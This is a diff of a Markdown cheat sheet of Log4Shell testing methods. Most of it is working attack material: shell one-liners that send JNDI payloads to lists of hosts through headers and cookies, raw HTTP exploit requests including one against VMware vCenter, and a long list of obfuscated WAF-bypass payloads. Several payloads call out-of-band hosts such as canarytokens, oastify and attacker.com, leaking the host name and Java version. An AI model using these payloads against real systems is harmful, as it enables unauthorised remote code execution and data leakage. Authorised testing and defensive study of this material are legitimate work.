@@ -1,17 +1,23 @@
 # Log4Shell Some Proved Testing Methods
  
 # Oneliner 1:
+```
 $ cat vulnerable-hosts.txt | sed 's/https\?:\/\///' | xargs -I {} echo '{}/${jndi:ldap://{}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' >> L4SFuzzList
 $ httpx -l L4SFuzzList
+```
 #Oneliner 2:
+```
 $ cat 1.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}";done (Credit:https://twitter.com/HackerGautam/status/1469751218926882816)
+ ```
  
 # The Great resource to learn and earn:
 https://github.com/pentesterland/Log4Shell
  
 # Screw-up the server (Run on your own risk). Gives you a lot fase-positives, but need to retest with other tools to confirm the valodation: 
+```
 cat vulnerable-hosts.txt |  httpx -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Cookie: mt.v=${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Cookie: CID_CART_COOKIE=${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Referer: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Origin: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Language: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-By: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-For: \${jndi:ldap://${hostName}.L4J.zdgnnnz669jsqwlr243a74pk1b72v5ju.oastify.com/a}' -H 'X-Forwarded-For-Original: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Host:${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Port: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Proto: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Protocol: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Scheme: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Server: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Ssl: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarder-For: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forward-For: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forward-Proto: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Frame-Options: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-From: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Geoip-Country: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-XSRF-TOKEN: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Datetime: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Charset: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Encoding: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Language: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}'
- 
+```
+```
 GET /test?id=%24%7Bj%24%7B::-n%7Ddi:dns%24%7B::-:%7D//quua8mp7vfexh3a3qkf1sggj9%24%7B::-.%7Dcanarytokens.com%7D HTTP/1.1
 User-Agent: ${j${::-n}di:dns${::-:}//quua8mp7vfexh3a3qkf1sggj9${::-.}canarytokens.com}
 Origin: ${j${::-n}di:dns${::-:}//quua8mp7vfexh3a3qkf1sggj9${::-.}canarytokens.com}
@@ -22,9 +28,11 @@ Accept-Encoding: gzip,deflate,br
 Host: ******
 Connection: Keep-alive
  
+``` 
 $ curl test.domain.com -H 'Cookie: CU_BRAND=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}'
  
 #Cookie based Log4Shell RCE
+```
 GET / HTTP/2
 Host: test.domain.com
 Referer: https://www.google.com/search?BC=en&q=testing
@@ -33,8 +41,9 @@ Cookie: mt.v=***; CU_ACT=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3q
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
  
+``` 
 #VMware vCenter Log4Shell RCE
- 
+```
 POST /analytics/telemetry/ph/api/hyper/send?_c=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}
 Host: test.domain.com
 Upgrade-Insecure-Requests: 1
@@ -44,7 +53,9 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
  
+``` 
 # Some Great WAF-Bypass Payloads to Play With
+```
 CREDIT: https://musana.net
 ${jndi:ldap://domain.com/j}
 ${jndi:ldap:/domain.com/a}
@@ -95,7 +106,8 @@ j${sys:k5:-nD}${lower:i${web:k5:-:}}
 j${::-nD}i${::-:}
 j${EnV:K5:-nD}i:
 j${loWer:Nd}i${uPper::} https://twitter.com/ymzkei5/status/1469765165348704256
- 
+```
+
 If you re filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you: (https://twitter.com/Rezn0k/status/1469523006015750146) 
 ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
 This gets past every filter I've found so far. There's no shortage of these bypasses.
@@ -185,6 +197,7 @@ ${jndi:ldap://${ctx:loginId}.domain.com/j}
  
 # Some Great Keywords to pay with: 
 Credit: https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+```
 ${ctx:loginId}
 ${map:type}
 ${filename}
@@ -334,6 +347,7 @@ X-Request-ID
 X-UIDH
 X-Wap-Profile
 X-XSRF-TOKEN
+```
  
 # Best Repo - I use this a lot
 https://github.com/fullhunt/log4j-scan 
